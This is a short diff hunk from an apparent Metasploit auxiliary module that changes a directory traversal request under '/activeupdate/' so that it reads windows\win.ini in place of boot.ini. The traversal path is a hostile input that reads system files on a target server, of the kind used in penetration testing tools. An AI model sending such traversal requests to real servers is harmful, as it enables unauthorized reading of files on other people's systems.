@@ -40,7 +40,7 @@ class Metasploit3 < Msf::Auxiliary
 
     res = send_request_raw(
       {
-        'uri'     => '/activeupdate/../../../../../../../../../../../boot.ini',
+        'uri'     => '/activeupdate/../../../../../../../../../../../windows\\win.ini',
         'method'  => 'GET',
       }, 20)
 
